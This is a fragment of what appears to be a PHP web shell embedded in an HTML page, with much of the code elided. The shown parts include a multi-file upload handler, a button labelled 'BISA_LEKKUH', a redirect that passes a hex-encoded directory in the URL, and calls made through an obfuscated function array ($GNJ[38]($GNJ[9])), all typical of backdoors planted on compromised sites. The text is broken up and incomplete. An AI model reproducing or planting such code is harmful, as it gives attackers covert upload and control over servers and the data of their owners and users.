...
<!DOCTYPE html>
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<link rel="stylesheet" href="//galvestoncup.com/my.shopify.com/main.css" type="text/css">
		...
		<body>
			...
			<article>
				...
				<div class="u">
					...
					$f = $o_[0].'BISA_LEKKUH!'.$o_[1];
					$g = $o_[0].'ERROR_LEKKUH!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
					...
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;BISA_LEKKUH&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
...
<?php
	...
	function BISA_LEKKUH() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&1");
		exit();
	}
	function ERROR_LEKKUH() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
